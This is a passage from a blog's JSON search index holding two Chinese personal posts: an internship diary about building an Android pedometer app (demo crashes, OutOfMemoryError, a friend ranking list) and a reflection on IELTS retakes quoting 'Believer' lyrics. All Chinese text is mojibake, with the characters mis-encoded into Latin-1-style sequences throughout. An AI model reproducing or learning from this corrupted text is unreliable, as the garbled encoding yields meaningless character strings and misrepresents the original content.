ä½¿ç”¨ç†è§£æœ‰è¯¯ï¼Œæ²¡æœ‰æˆåŠŸï¼Œæš‚æ—¶å…ˆè¿™æ ·å§ã€‚  \næ™šä¸Šå›å»å‘ç°å¯å®¤åˆ·æ¼†ï¼Œå‘³é“å¾ˆé‡ï¼Œå®¤å‹ä»¬å‡ºå»ä½å®¾é¦†ï¼Œæˆ‘æœ¬æ¥ä¹Ÿæ˜¯æƒ³çš„ï¼Œä½†æ˜¯æ²¡é’±å•Šï¼Œå°±å»æˆ‘å§é‚£é‡Œä½äº†ï¼Œæˆ‘å§æ€€å­•äº†ï¼Œæ˜å¹´ç­‰å¤–ç”¥(å¥³)å‡ºç”Ÿæˆ‘å°±åªèƒ½çœ‹ä»–ä¸¤çœ¼ç„¶åå°±èµ°äº†(å¦‚æœé‚£ä¸ªæ—¶å€™å‡ºå›½çš„è¯)\n\n### ç¬¬å…«å¤©(7/17)\n\nä¸ŠåˆæŠŠç»„å‘˜lmjæ¨¡ä»¿å†™çš„è‡ªå®šä¹‰çš„æ˜¾ç¤ºæ­¥æ•°çš„æ§ä»¶åŠ åˆ° fragment é‡Œé¢ï¼Œå‰å¤©é—®Dylanä¸ºä»€ä¹ˆ StepService é‡Œé¢è¦åŠ é‚£ä¹ˆå¤šè®°å½•æ­¥æ•°çš„å˜é‡ã€‚  \n \n![æˆ‘çš„é—®é¢˜](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627163758.jpg)\n\nç„¶åä»–å¯èƒ½å¤ªå¿™äº†ï¼Œè¿˜æ²¡æœ‰å›ï¼Œæˆ‘å°±å…ˆç›´æ¥æŒ‰ç…§ä»–çš„å†™æ³•æŠŠè¿™äº›å˜é‡åŠ è¿›å»äº†ã€‚ç„¶åå®‰å“æ»‘åŠ¨æ‚¬æµ®ç½®é¡¶çš„æ•ˆæœçœ‹äº†ä¸€ä¸‹ï¼Œæƒ³æŠŠè¿™ä¸ªæ•ˆæœåŠ è¿›å»ã€‚  \nä¸‹åˆç»§ç»­æ·»åŠ ä¸€äº›å°åŠŸèƒ½å’Œé¡µé¢ï¼Œç»„å‘˜tlå†™äº†ä¸€ä¸ª videoview ä¸ºèƒŒæ™¯çš„æ¬¢è¿é¡µé¢ï¼Œä¸‹åˆæ”¶å·¥åæˆ‘å» #507 ç ”ç©¶äº†ä¸€ä¼šåŠ åˆ°åº”ç”¨ä¸Šäº†ã€‚\n\n### ç¬¬ä¹å¤©(7/18)\n\næ˜¨å¤©åŠ äº†ç»„å‘˜tlçš„æ¬¢è¿ç•Œé¢ï¼Œæ„Ÿè§‰å¾ˆé…·ç‚«ï¼Œä½†æ˜¯å®ƒæ³¨å†Œçš„æ—¶å€™æ²¡æœ‰ç¡®è®¤å¯†ç è¿™ä¸€æ ï¼Œæ„Ÿè§‰ä¸çˆ½å°±åªæœ‰èˆå¼ƒå®ƒè‡ªå¸¦çš„åŠ¨ç”»ï¼Œå†™ä¸€ä¸ªæŒ‰é’®è¿›å»ç™»å½• activity é‡Œã€‚ä¸Šåˆè€å¸ˆè¿˜è¦æ±‚æ˜å¤©é¡¹ç›®ä¸­æœŸå±•ç¤ºã€‚\nä¸‹åˆè‡ªå®šä¹‰äº†ä¸€ä¸ª SettingItem ï¼Œç„¶ååˆå§‹åŒ–å¤šä¸ªåŠ å…¥åˆ°è®¾ç½®çš„ fragment é‡Œï¼Œæ„Ÿè§‰å¥½è ¢ï¼Œæ„Ÿè§‰è‡ªå·±å†™çš„ä¸œè¥¿å°±æ˜¯è¦ UI æ²¡ UI ï¼Œè¦ä¼˜åŒ–æ²¡ä¼˜åŒ–ã€‚\n\n### ç¬¬åå¤©(7/19)\n\nä»Šå¤©æ˜¯æœ€éš¾è¿‡çš„ä¸€å¤©ã€‚  \nä¸Šåˆåˆ°å®éªŒå®¤ï¼Œå‡†å¤‡é¡¹ç›®å±•ç¤ºï¼Œè‡ªå·±éƒ½ä¸çŸ¥é“æ”¹äº†ä»€ä¹ˆï¼Œç¨‹åºçªç„¶å°±é—ªé€€ï¼Œè€Œä¸”æ˜¯æ‰“å¼€ç›´æ¥é—ªé€€ï¼Œæˆ‘ä»¬ç»„æ˜¯ç¬¬äºŒä¸ªå±•ç¤ºçš„ï¼Œé¡¿æ—¶æ„Ÿè§‰å¾ˆæ…Œï¼Œä¿®æ”¹æ¥ä¿®æ”¹å»ä¸çŸ¥é“è¦å¹²äº›ä»€ä¹ˆï¼Œå¥½ä¹…éƒ½æ²¡æœ‰è¿™ç§æ„Ÿè§‰äº†ï¼Œç¬¬ä¸€æ¬¡è€ƒé›…æ€éƒ½æ²¡æœ‰è¿™ä¹ˆé­‚ä¸å®ˆèˆè¿‡ã€‚æ‰¾ç»ç†è¯´äº†è¯´ï¼Œå«ä»–ç»™æˆ‘ä»¬å®‰æ’åœ¨ä¸‹åˆï¼Œä¸Šåˆç»§ç»­åœ¨ä¿®æ”¹ï¼Œä¸­é—´æœ‰ä¸ªåŒå­¦å€Ÿæˆ‘ç”µè„‘å»åšå±•ç¤º(ä»–ç”µè„‘æ²¡æœ‰ vga æ¥å£)ï¼Œç”¨å®Œå’Œæˆ‘èŠäº†ä¸¤å¥ï¼ŒçŸ¥é“æˆ‘çš„æƒ…å†µåï¼Œå¥½å¿ƒåœ°å¸®æˆ‘æŸ¥äº†é”™ï¼Œç„¶åå°±ç»™æŸ¥å‡ºæ¥äº†ï¼Œåˆæ•™äº†æˆ‘ä¸€æ‹›ï¼Œä¸€ä¸ªæ˜¯æˆ‘åŠ è¿›é¡¹ç›®çš„å›¾ç‰‡å¤ªå¤§ï¼ŒåŠ¨ç”»éƒ½å¡é¡¿ï¼Œæœ€åæŠ¥é”™ outofmemoryerror ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯è‡ªå·±å°è£…ä½¿ç”¨ sharedpreferences çš„å·¥å…·ç±»å¿˜è®°å®ä¾‹åŒ–ï¼Œä½¿ç”¨è¿‡ç¨‹æŠ¥é”™ nullpointerecxeption ï¼Œè€Œä¸”å¥½åƒ fragmentä¸­getActivity() æ–¹æ³•ä¸èƒ½æ”¾åœ¨ç‚¹å‡»äº‹ä»¶é‡Œï¼Œä¸ç„¶å°±é—ªé€€ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚  \nä¸‹åˆç¬¬ä¸€ä¸ªä¸Šå»å±•ç¤ºï¼Œæ•´ä¸ªäººéƒ½æ˜¯å…­ç¥æ— ä¸»çš„ï¼Œå±•ç¤ºå®Œæ‰çŸ¥é“è‡ªå·±å†™å¾—æœ‰å¤šåƒåœ¾ï¼Œå”‰ï¼Œä¸‹åˆå¿ƒæ…Œï¼Œæ•ˆç‡æä½ï¼ŒåŠ ä¸Šä¸­åˆåˆè§‰æ²¡ç¡å¥½ï¼Œç¬¬ä¸€æ¬¡æ„Ÿè§‰åˆ°æ¥è‡ªITçš„å·¨å¤§å‹åŠ›ã€‚ä¸­é€”ç»„å‘˜zzhå«æˆ‘å¸®ä»–çœ‹é”™è¯¯ï¼Œä¹Ÿå¿ƒä¸åœ¨ç„‰ï¼Œä»Šå¤©çœŸçš„æ˜¯åºŸæ‰çš„ä¸€å¤©ï¼Œæ•´ç†ä¸€ä¸‹æ˜å¤©æ•´è£…ç„•å‘ã€‚æé«˜æ•ˆç‡ï¼æ•ˆç‡ï¼ï¼\n\n### ç¬¬åä¸€å¤©(7/20)\n\nä¸Šåˆæ·»åŠ æŠŠè®¡æ­¥æ•°æ®æ·»åŠ åˆ°æ•°æ®åº“ä¸­ï¼Œå¹¶è®¾ç½® 30m æ›´æ–°ä¸€æ¬¡(æ›´æ–°é¢‘ç‡æœ‰ç‚¹å¿«äº†ï¼Œä¸è¿‡å¯ä»¥è°ƒ)ï¼Œç„¶åå°±å¼€å§‹æ¼«æ— ç›®çš„äº†ï¼Œæ‰“ç®—ä»Šå¤©æŠŠç»„å‘˜zzfå†™çš„å¥½å‹åŠŸèƒ½æ·»åŠ åˆ°åº”ç”¨é‡Œï¼Œæ„Ÿè§‰å¥½åƒåˆåšä¸å®Œäº†ã€‚ã€‚\nä¸‹åˆæ·»åŠ äº†æŸ¥æ‰¾å¥½å‹å¹¶å…³æ³¨åŠŸèƒ½ã€‚æ™šä¸Šå»æ¬å¯å®¤äº†ï¼ˆå­¦æ ¡äº†è§£æƒ…å†µåå®‰æ’äº†å¯å®¤ï¼‰ã€‚\n\n### ç¬¬åäºŒå¤©(7/21)\n\nä¸Šåˆå†™äº†ä¸€ä¸ª recyclerview æ¥åšå¥½å‹æ’ååŠŸèƒ½ï¼Œä¸­é€”è½¯é…·çš„è€æ€»æ¥è°ˆè¯äº†ï¼Œå’Œæˆ‘ä»¬èŠäº†ä¸€ä¼šï¼Œç»™äº†ä¸€ç‚¹é¼“åŠ±ï¼Œè§£å†³äº†ä¸€ç‚¹æˆ‘çš„å›°æƒ‘ã€‚  \nä¸‹åˆå› ä¸º recyclerview ä½¿ç”¨ä¸ç†Ÿç»ƒå°±æ›¿æ¢æˆ listview äº†(æˆ‘åŸæ¥çœ‹çš„ç¬¬ä¸€è¡Œä»£ç ç¬¬ä¸€ç‰ˆ)ï¼Œç„¶åå®ç°äº†å±•ç¤ºå…³æ³¨å¥½å‹æ­¥æ•°çš„åŠŸèƒ½ï¼Œä»Šå¤©ç•Œé¢ï¼Œç„¶ååˆæŠŠåœ¨ä¸»ç•Œé¢å±•ç¤ºå†å²æ­¥æ•°çš„åŠŸèƒ½ç»™åŠ äº†ï¼Œæ­¤æ—¶ç•Œé¢å¾ˆä¸‘é™‹ï¼Œä½¿ç”¨çš„çº¯å®‰å“æ§ä»¶(æŒ‰é’®ï¼Œlistview ä¹‹ç±»ä»€ä¹ˆçš„éƒ½æ²¡æœ‰è‡ªå®šä¹‰)ã€‚æ˜å¤©å†æ”¹ç•Œé¢ã€‚\n\n### ç¬¬åä¸‰å¤©(7/22)\n\nä»Šå¤©ä¸Šåˆæ˜¯æ‰“ç®—å¼€å§‹æ”¹ç•Œé¢çš„ï¼Œå¼€å§‹æ²¡å¤šä¹…ï¼Œç°åœºç»ç†å°±è¯´è¦æ£€æŸ¥ä¸€ä¸‹ç›®å‰é¡¹ç›®çš„æƒ…å†µï¼Œå“‡ï¼æˆ‘è¿™è¿™ä¹ˆä¸‘çš„ä¸œè¥¿æ€ä¹ˆæ‹¿å¾—å‡ºæ‰‹ï¼Œæ²¡åŠæ³•ï¼Œç¡¬ç€å¤´çš®ç»™ä»–çœ‹äº†ï¼Œä»–å¾ˆå°´å°¬ï¼Œæˆ‘ä¹Ÿå¾ˆéš¾è¿‡ï¼Œä»–è¯´æˆ‘è¿™æ ·æ˜å¤©é¡¹ç›®å±•ç¤ºæ€•æ˜¯è¦ç¿»æ°´æ°´ã€‚ã€‚ã€‚æˆ‘å°±è·Ÿä»–è¯´æˆ‘è¿˜åœ¨æ”¹ï¼Œä»–è¯´ç•Œé¢ç°åœ¨æ”¹æ€•æ˜¯æ¥ä¸åŠäº†ï¼Œå«æˆ‘é¡¹ç›®å±•ç¤ºçš„æ—¶å€™æŠŠå¤§å°åŠŸèƒ½å…¨éƒ½å±•ç¤ºå‡ºæ¥ã€‚ã€‚ã€‚æˆ‘å¾ˆç»æœ›ï¼Œæ²¡åŠæ³•ï¼Œç»§ç»­åŠªåŠ›ä¿®æ”¹ä¸­ã€‚  \nä¸‹åˆç»ç†åˆå¸ƒç½®ä»»åŠ¡è¦æäº¤é¡¹ç›®æœ€ç»ˆæ–‡æ¡£ï¼Œå•Šäººéƒ½å´©æºƒäº†ï¼Œå¥½åœ¨ç»è¿‡ä¸ŠåˆåŠªåŠ›ï¼Œç•Œé¢é—®é¢˜ä¸æ˜¯å¾ˆå¤§äº†ï¼Œç„¶åå»ç½‘ä¸Šæ‰¾äº†å¥–ç‰Œä¼˜åŒ–ä¸€ä¸‹æ­¥æ•°æ’è¡Œçš„æ˜¾ç¤ºã€‚  \nåˆ°äº†æ™šä¸Šå½“ç„¶åœ¨åŠ ç­å†™æ–‡æ¡£å•Šã€‚ã€‚ã€‚æœ¬æ¥ä¸­åˆå°±æ²¡åˆç¡ï¼Œä¸‹åˆåˆå†™äº†ä¸€ä¸‹åˆï¼Œæ™šä¸Šå›å»å…ˆç¡äº†ä¸€ä¸ªå°è§‰ç„¶ååˆå¼€å§‹èµ¶ã€‚deadline æ°¸è¿œéƒ½è¿™ä¹ˆå‹è¿«äººã€‚\n\n### ç¬¬åå››å¤©(7/23)\n\nå¼€å§‹é¡¹ç›®å±•ç¤ºäº†ï¼Œè«åæœ‰ç‚¹ç´§å¼ ï¼Œå’Œç»ç†è¯´å¸®å¿™å®‰æ’åˆ°ç¬¬äº”æˆ–è€…ç¬¬å…­ä¸ªå°ç»„å±•ç¤ºï¼Œä½†æˆ‘ä»¬å±•ç¤ºçš„æ—¶å€™è€æ€»æ­£å¥½åœ¨å’Œä¸€ä¸ªè€å¸ˆèŠå¤©ï¼Œçœ‹æˆ‘çš„åªæœ‰ç»ç†ï¼Œè¿™æ ·è€æ€»å°±ä¸ä¼šåœ¨æˆ‘æ¼”ç¤ºå®Œä¸œé—®è¥¿é—®äº†ï¼Œæ¼”ç¤ºå®Œç»ç†é—®äº†æˆ‘å‡ ä¸ªé—®é¢˜ï¼Œæˆ‘é¿å¼€äº†é¡¹ç›®çš„ bugï¼Œç»™ä»–ç•™ä¸‹äº†ä¸€ä¸ªå¥½å°è±¡ï¼Œå¦å¤–æ˜¨å¤©ä»–çœ‹æˆ‘çš„ä¸‘ç•Œé¢å·²ç»è¢«æˆ‘ä¼˜åŒ–å¾—å·®ä¸å¤šäº†ï¼Œä»–ä¹Ÿå¾ˆåƒæƒŠï¼Œäººéƒ½æ˜¯è¢«é€¼å‡ºæ¥çš„ã€‚ç„¶åè€æ€»è¿‡æ¥å¤§è‡´çœ‹äº†çœ‹é¡¹ç›®ï¼Œæ„Ÿè§‰è¿˜ä¸é”™ï¼Œå¯¹æˆ‘è¡¨ç¤ºèµèµï¼Œå¿ƒé‡Œé€äº†ä¸€å£æ°”(è¯´å®è¯æˆ‘æ„Ÿè§‰ç°åœ¨å‰é¢åšæ¼”ç¤ºçš„æ—¶å€™æˆ‘çš„è¡¨ç°è¿˜ä¸é”™)ã€‚\nä¸‹åˆæ˜¯ä¸Šåˆå‰©ä¸‹çš„å°ç»„ç»§ç»­åšå±•ç¤ºï¼Œå±•ç¤ºå®Œè€æ€»è®²è¯ï¼Œè¯´äº†ä¸€ä¸‹è¿™ä¸ªè½¯ä»¶å·¥ç¨‹ä¸“ä¸šå‰çš„èƒŒæ™¯ï¼Œå…¶ä»–çš„ä¹ŸèŠäº†ä¸€ä¸‹ã€‚æˆ‘è¿˜åšäº†ä¸€ç‚¹å°ç¬”è®°ğŸ¤“ï¼Œç„¶åå°±å·®ä¸å¤šæ”¶å·¥äº†ï¼Œç»ç†åˆå¸ƒç½®äº†å®Œæˆç¬¬äºŒå‘¨é¡¹ç›®å‘¨æŠ¥ã€‚\næ™šä¸Šå¾…åœ¨å®éªŒå®¤ï¼Œæ‰“ç®—å†™å‘¨æŠ¥ï¼Œä¸­é€”ä¸€ä¸ªç ”ç©¶ç”Ÿå­¦é•¿è¿‡æ¥æ‰¾æˆ‘èŠäº†ä¸€ä¼šå¤©ï¼Œ(èŠå¤©å†…å®¹å°±ä¸è¯´äº†)ä¹ŸæŠŠæˆ‘åœ¨å®éªŒå®¤é—´æ–­æ²¡ç½‘çš„é—®é¢˜è§£å†³äº†ã€‚å‘¨æŠ¥å®Œæˆæäº¤åï¼Œç»™é¡¹ç›®ä»£ç åŠ äº†ç•¥è¯¦ç»†ä¸”æœ‰æ¡ç†çš„æ³¨é‡Šï¼Œå¹¶ä¿®æ”¹äº†ä¹‹å‰æ–‡æ¡£é‡Œé¢å­˜åœ¨çš„ä¸€äº›é”™è¯¯ï¼Œç„¶åå°±å›å¯å®¤äº†ã€‚\n\n### ç¬¬åäº”å¤©(7/24)\n\nä»Šå¤©åº”è¯¥æ˜¯ä¸Šåˆå…¬å¸å†…éƒ¨é¡¹ç›®è¯„ä¼˜ï¼Œä¸‹åˆå­¦æ ¡å¼€ä¼šï¼Œå…¬å¸é—´è¯„ä¼˜ï¼Œç¬¬ä¸€åè¿˜æœ‰800å…ƒå¥–é‡‘ï¼Œæ˜¾ç„¶è·Ÿæˆ‘æ— ç¼˜ã€‚\nå†…éƒ¨è¯„ä¼˜æˆ‘å¾—äº†ä¸€ä¸ªä¸ªäººä¼˜ç§€å¥–ï¼Œæœ¬æ¥è¿˜ä»¥ä¸ºèƒ½è·å¾—ä¼˜ç§€é¡¹ç›®å¥–çš„ï¼Œä¸è¿‡ä¹ŸçŸ¥è¶³äº†ï¼Œå†å¤šæƒ³å°±æœ‰ç‚¹è´ªå¿ƒä¸è¶³è›‡åè±¡äº†ã€‚\nä¸‹åˆæˆ‘å°±å›å®¶äº†ï¼Œè½¦ä¸Šå¾—çŸ¥æˆ‘ä»¬å…¬å¸ä¸€ä¸ªå°ç»„å¾—äº†ç¬¬ä¸€å(ä»–ä»¬é¡¹ç›®åšçš„æ€ä¹ˆæ ·æˆ‘ä¸çŸ¥é“ï¼Œä½†æ˜¯å±•ç¤ºç¯èŠ‚çœŸçš„æ˜¯å¼º)ï¼Œæ­å–œæ­å–œã€‚\n\n## å°ç»“\n\nè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è¿™ä¹ˆç¨æ˜¾æ­£å¼çš„ç¯å¢ƒé‡Œå†™ä»£ç ï¼Œæœ€åçš„æˆæœå¹¶ä¸ä»¤äººæ»¡æ„ã€‚è¿‡ç¨‹ä¸­æˆ‘ç»„é•¿çš„èŒè´£ä¹Ÿæ¬ ç¼ºå®è¡Œï¼Œå…¶å®æ²¡ä»€ä¹ˆè¯´çš„ï¼Œè¿™æ¬¡å®ä¹ è®©æˆ‘è§è¯†åˆ°äº†æŠ€æœ¯ä¸Šè‡ªå·±æœ‰å¤šèœï¼Œå¥½åœ¨è¿™å­¦æœŸé›…æ€è¿‡äº†ï¼Œä¸‹ä¸€å­¦å¹´å¥½å¥½å¼€å§‹å†™ä»£ç ã€‚\n\n## æœ€å\n\nå‰é¢ä¸‰ä¸ªå­¦æœŸéƒ½æœ‰é¡¹ç›®è®¾è®¡ï¼Œåšå¾—æˆ‘è‡ªå·±éƒ½æ„Ÿè§‰æ‹¿ä¸å‡ºæ‰‹ï¼Œè™½ç„¶è€å¸ˆåˆ†æ•°ä¸Šç»™è¿‡äº†ï¼Œæˆ‘å¿ƒé‡Œéƒ½æ˜¯å†…ç–šçš„ã€‚  \næˆ‘ç°åœ¨å°±å½“æˆ‘é¡¹ç›®è®¾è®¡æ²¡æœ‰åšï¼Œä¸‹ä¸ªå­¦å¹´æŠŠè¿™äº›éƒ½è¡¥ä¸Šã€‚  \n\n- tjè€å¸ˆçš„é¡¹ç›® - ç•ªèŒ„æ—¶é’Ÿè®¡æ—¶å™¨\n- tjè€å¸ˆçš„é¡¹ç›® - å®‰å“è¯­éŸ³èŠå¤©æœºå™¨äºº\n- wxnè€å¸ˆçš„é¡¹ç›® - å®‰å“æ–°é—»å’Œè¯„è®ºå®¢æˆ·ç«¯  \n  æŠŠè¿™æ¬¡å®è®­ä¹ŸåŠ ä¸Šå§\n- yyç»ç†çš„é¡¹ç›® - å®‰å“è®¡æ­¥å™¨","tags":["untagged"]},{"title":"é›…æ€å›é¡¾","url":"/2017/06/17/ielts-lookback/","content":"\n> First thing's first  \n> I'ma say all the words inside my head  \n> I'm fired up and tired of the things have been.\n\nç¬¬ä¸€æ¬¡é›…æ€æˆç»©  \n![](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627162053.png) \n\nç¬¬äºŒæ¬¡é›…æ€æˆç»©  \n![](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627162100.png)\n\n> Second thing's second  \n> Don't you tell me what you think that I can be  \n> I'm the one at the sail  \n> I'm the master of my sea\n\næˆ‘åªæ˜¯ä¸‡åƒè€ƒé¸­ä¸­æœ€æ™®é€šçš„ä¸€åªï¼ŒäºŒè€ƒçš„æˆç»©å¯èƒ½ç®—æ˜¯æ¯”è¾ƒä»¤äººæ»¡æ„çš„ã€‚  \næˆ‘æ²¡æœ‰ä»€ä¹ˆè€ƒè¯•æŠ€å·§è¦å’Œå¤§å®¶åˆ†äº«ï¼Œæˆ‘åªæ˜¯æƒ³å†™å†™è€ƒè¿™æ¬¡é›…æ€çš„ä¸€äº›æ„Ÿæƒ³ï¼ˆæƒ³åˆ°å“ªå†™åˆ°å“ªï¼‰\n\nå…ˆæ¥è¯´ä¸‹è¿™æ¬¡æˆç»©å§ã€‚å¦‚æœä¸æ˜¯é˜…è¯»å¡«è¡¥äº†æˆ‘å¿ƒé‡Œçš„ç©ºç¼ºï¼Œå¬åŠ›è¦é—æ†¾å¥½ä¹…ï¼ŒäºŒè€ƒå¬åŠ›è¾ƒä¸€è€ƒæ²¡æœ‰è¿›æ­¥ï¼Œè€Œä¸”å…³é”®æ˜¯æˆ‘å¤ä¹ ä¸»ç»ƒå¬åŠ›çš„ï¼Œå¹³å‡ä¸‹æ¥ï¼Œå¬ä¸¤ä¸ª test å¬åŠ›ï¼Œæ‰ä¼šåšä¸€ä¸ª test çš„é˜…è¯»ã€‚è¿™æ¬¡å¬åŠ›å’Œé˜…è¯»åˆ†æ•°å¦‚æœäº’æ¢ï¼Œå°±æ˜¯æœ€ç¬¦åˆæˆ‘çš„é¢„æœŸäº†ã€‚å®é™…ä¸Šè€ƒå®Œç¬”è¯•ï¼Œç¨ç¨å¯¹äº†å¯¹ç­”æ¡ˆï¼Œå°±çŸ¥é“å¬åŠ›å¯èƒ½åªæœ‰ 7 äº†ã€‚é˜…è¯»æ˜¯æ¯”è¾ƒæ„å¤–çš„ï¼Œè€ƒå®Œæ„Ÿè§‰è¿˜ä¸é”™ä¹Ÿæ²¡å¤šæƒ³ï¼Œä¸è¿‡ä¹Ÿåº”è¯¥å’Œ 6.3 çš„é¢˜ç›®åç®€å•æœ‰å…³ç³»å§ã€‚å†™ä½œå¾ˆæ„Ÿè°¢è€å¸ˆï¼Œè€ƒè¯•å‰ä¸¤å‘¨æ­£å¥½ç»“è¯¾ï¼Œæ­£å¥½æŠŠä½œæ–‡è®²å®Œï¼Œå°ä½œæ–‡å’Œå¤§ä½œæ–‡éƒ½è®²çš„å¾ˆæœ‰æ¡ç†ï¼Œè½®å»“ç»“æ„å¾ˆæ¸…æ™°ï¼Œæƒ³æ‹¿é«˜åˆ†å°±çœ‹æ€ä¹ˆå†™äº†ï¼Œè¿™æ¬¡ä½œæ–‡è¿›æ­¥ 1.5 åˆ†æˆ‘è®¤ä¸ºç®—æ˜¯å•é¡¹é‡Œé¢è¿›æ­¥æœ€å¤§çš„ï¼ˆä½œæ–‡è¿›æ­¥ 1.5 åˆ†æ¯”é˜…è¯»è¿›æ­¥ 2 åˆ†åº”è¯¥è¿˜æ˜¯è¦éš¾å§ï¼‰ã€‚å£è¯­çš„è¯åº”è¯¥æ˜¯æ­£å¸¸çš„æ°´å¹³å§ï¼Œå¤ä¹ çš„æ—¶å€™æ²¡æœ‰æƒ³æ€ä¹ˆå»å‡†å¤‡ï¼Œå› ä¸ºè§‰å¾—è¿™ä¸ªæ˜¯å‡†å¤‡ä¸å®Œçš„ï¼Œæ‰€ä»¥è€ƒå£è¯­å‰ä¸€å¤©æŠŠå‡ ä¸ªé«˜é¢‘è¯é¢˜æçº²å†™äº†ä¸€ä¸‹ã€‚è€ƒè¯• part 2 æŠ½åˆ°çš„é¢˜ç›®æ˜¯ â€”â€”\n\nDescribe a leisure activity on or by the sea that you would like to try, you should say:\n\n- What the activity is?\n- What preparation you need to do?\n- How easy it is to do?\n\nç„¶å part 3 å°±æ˜¯æ ¹æ® part 2 æ‰©å±•ä¸€äº›è¯é¢˜(sea, beach)æ¥è®¨è®ºï¼Œæ¯”å¦‚è¯´ \"Do you think that children are more likely to spend time on beach than old people, why?\"\n\næˆ‘çš„è®¡åˆ’å°±æ˜¯ä¸ŠåŠå¹´æŠŠé›…æ€è¿‡äº†ï¼Œåé¢è¿™æ®µæ—¶é—´è¦å‡†å¤‡æœŸæœ«è€ƒè¯•ï¼Œæ‰€ä»¥æå‰åˆ°ç¬¬åå…­å‘¨è€ƒã€‚å››æœˆåˆè€ƒå®Œè“æ¡¥æ¯çœèµ›æ–©é’‰æˆªé“æŠ¥å 6.3 é›…æ€ï¼Œä¸èƒ½å†æ‹–äº†ã€‚ï¼ˆä¸­é—´çœèµ›è¿‡äº†ï¼Œè¿›äº†å›½èµ›ï¼Œæ—¥æœŸå®šä¸º 5.27ï¼Œå·®ä¸€ç‚¹å°±å’Œé›…æ€å†²çªäº†ï¼Œè¦æ˜¯å†²çªäº†ï¼Œæˆ‘æƒ³åº”è¯¥ä¼šæ”¾å¼ƒå›½èµ›å§ï¼‰æ¥ä¸‹æ¥å°±æ˜¯å¤ä¹ å¤‡è€ƒï¼Œä¸¤ä¸ªç›®æ ‡ â€”â€” è“æ¡¥æ¯å’Œé›…æ€ï¼Œå…¶ä¸­é›…æ€ä¸ºé¦–ï¼Œå¿…è¦æƒ…å†µä¸‹æç½®è“æ¡¥æ¯ã€‚åŠªåŠ›äº†æ€ä¹ˆä¼šç™½è´¹å‘¢ï¼Ÿè¿›è€ƒåœºä¹‹å‰æˆ‘å°±æƒ³å¥½äº†ï¼Œè¿™æ¬¡é›…æ€è¿‡äº†å°±å¾ˆèˆ’æœã€‚æ²¡è¿‡è‡³å°‘æˆ‘ä¹Ÿåº”è¯¥å¯ä»¥çœ‹è§è¿›æ­¥ï¼Œåªèƒ½è¯´æ˜åŠªåŠ›ä¸å¤Ÿï¼Œæš‘å‡å†å‡†å¤‡å†è€ƒï¼Œä¸‹ä¸€åœºéƒ½å·²ç»çœ‹å¥½æ—¶é—´äº† (8.26)ã€‚\n\n> Third thing's third  \n> Send a prayer to the ones up above  \n> All the hate that you've heard has turned your spirit to a dove\n\nç¬¬ä¸€æ¬¡è€ƒè¯•æ€»åˆ†å·® 0.5 åˆ†åˆ° 6ï¼ŒæŒºå¯æƒœçš„ï¼ŒåŸæœ¬æƒ³å¤è®®çš„ï¼Œåæ¥æ”¾å¼ƒäº†ã€‚ç¬¬ä¸€ä¸ªï¼Œå¤è®®è¦ 1000 å—ï¼ï¼ï¼è™½ç„¶å¤è®®æˆåŠŸå¯é€€è¿˜ï¼Œä½†è¦æ˜¯å¤±è´¥å‘¢ï¼Ÿä¸æ•¢å†’è¿™ä¸ªé™©ï¼›ç¬¬äºŒä¸ªï¼Œå¤è®®å°±ç®—æˆåŠŸäº†ä¹Ÿåªæœ‰ 6 åˆ†ï¼Œä¸ºä»€ä¹ˆä¸å†è€ƒä¸€æ¬¡ï¼Œè¿˜æœ‰æœºä¼šè€ƒå¾—æ›´é«˜å‘¢ï¼ˆäº‹å®è¯æ˜ï¼šæˆ‘çš„é€‰æ‹©æ˜¯æ­£ç¡®çš„ï¼‰\n\nå£è¯­è€ƒè¯•æˆ´çš„é›…æ€ç™½æ‰‹ç¯æˆ‘è¿˜ç•™ç€ï¼Œç¬”è¯•çš„çº¢æ‰‹ç¯è¦è¢«å›æ”¶ï¼Œè€ƒè¯•å®Œå›æ”¶çš„æ—¶å€™æˆ‘é—®äº†å¥ \"Can I keep this as a souvenir?\"ï¼Œ\"Sorry, you can't\"ã€‚ã€‚ã€‚è¿˜æ˜¯æŒºæƒ³ç•™ä¸‹æ¥å½“çºªå¿µçš„ã€‚\n\nè€ƒå®Œå›å­¦æ ¡çš„è·¯ä¸Šï¼Œèµ¶ç´§æ‰“å¼€æ‰‹æœºï¼Œä¸‹è½½ç½‘æ˜“äº‘éŸ³ä¹å¬æ­Œï¼Œä¸ºäº†é›…æ€ï¼Œæˆ‘æŠŠæ‰€æœ‰æ­Œéƒ½åˆ é™¤äº†ï¼Œæ¢æˆäº†é›…æ€å¬åŠ›ï¼Œè¿™å°†è¿‘ä¸¤ä¸ªæœˆçš„æ—¶é—´å†…ï¼Œå…¨æ˜¯ \"Now listen carefully and answer question one to forty!\"\n\nä¸‹è½½çš„ç¬¬ä¸€é¦–æ­Œå°±æ˜¯ Believer - Imagine Dragonsï¼Œæˆ‘æ ‡æ³¨å‡ºæ¥çš„å°±æ˜¯è¿™é¦–æ­Œçš„æ­Œè¯ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆæ˜¯è¿™é¦–æ­Œï¼Œåªæ˜¯èµ°å‡ºè€ƒåœºè¿™é¦–æ­Œçš„æ—‹å¾‹å§‹ç»ˆåœ¨æˆ‘è„‘ä¸­å›è¡ - \"You break me down, you build me up, believer, believer!\"ã€‚å¤§æ¦‚æ˜¯å› ä¸ºæˆ‘æ˜¯ä¸€ä¸ª believer who believe \"You reap what you sow\" å§ã€‚\n\nä¸‹é¢å°±æ˜¯è¿™é¦–æ­Œï¼Œä½ å¯ä»¥ç‚¹å‡»å¬ä¸€ä¸‹\n\n<audio src=\"/assets/Imagine Dragons - Believer.mp3\" controls=\"controls\" preload=\"auto\"></audio>\n\n> Last thing's last  \n> By the grace of the fire and the flames  \n> You're the face of the future  \n> The blood in my veins\n\nå¤§éƒ¨åˆ†æ—¶é—´ç•™ç»™äº†é›…æ€ï¼Œè“æ¡¥æ¯æ²¡æœ‰å–å¾—æƒ³è¦çš„æˆç»©æ˜¯ä¸€ä¸ªé—æ†¾ï¼Œæœ‰èˆå¿…æœ‰å¾—å§ã€‚<br>ç›®å‰æ¥è¯´çš„è¯ï¼Œé›…æ€å­¦ä¹ 